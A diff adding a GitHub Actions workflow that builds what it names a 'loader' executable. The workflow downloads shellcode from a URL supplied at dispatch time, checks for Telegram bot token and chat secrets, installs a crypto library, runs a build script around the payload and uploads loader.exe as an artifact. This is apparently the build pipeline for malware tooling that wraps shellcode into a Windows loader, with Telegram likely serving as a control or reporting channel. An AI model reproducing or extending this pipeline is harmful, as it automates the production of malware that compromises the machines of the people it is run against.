@@ -1,0 +1,56 @@
+# language: YAML, file: .github/workflows/build.yml
+name: build
+
+on:
+  workflow_dispatch:
+    inputs:
+      payload_url:
+        description: "raw URL to position-independent payload (shellcode)"
+        required: true
+        type: string
+  push:
+    tags: ['v*']
+
+jobs:
+  build:
+    runs-on: windows-latest
+    env:
+      TG_TOKEN: ${{ secrets.TG_TOKEN }}
+      TG_CHAT:  ${{ secrets.TG_CHAT }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Fetch payload
+        shell: pwsh
+        run: |
+          $u = "${{ github.event.inputs.payload_url }}"
+          if (-not $u) { $u = "${{ vars.PAYLOAD_URL }}" }
+          if (-not $u) { throw "payload_url not set" }
+          Invoke-WebRequest -Uri $u -OutFile payload.bin
+
+      - name: Sanity check secrets
+        shell: pwsh
+        run: |
+          if (-not $env:TG_TOKEN) { throw "TG_TOKEN missing" }
+          if (-not $env:TG_CHAT)  { throw "TG_CHAT missing" }
+          Write-Host "secrets present, length token=$($env:TG_TOKEN.Length) chat=$($env:TG_CHAT.Length)"
+
+      - name: MSVC env
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x64
+
+      - name: Install PyCryptodome
+        shell: pwsh
+        run: pip install pycryptodome
+
+      - name: Build
+        shell: pwsh
+        run: ./build.ps1 -Payload payload.bin -Out output
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: loader
+          path: output/loader.exe
+          if-no-files-found: error
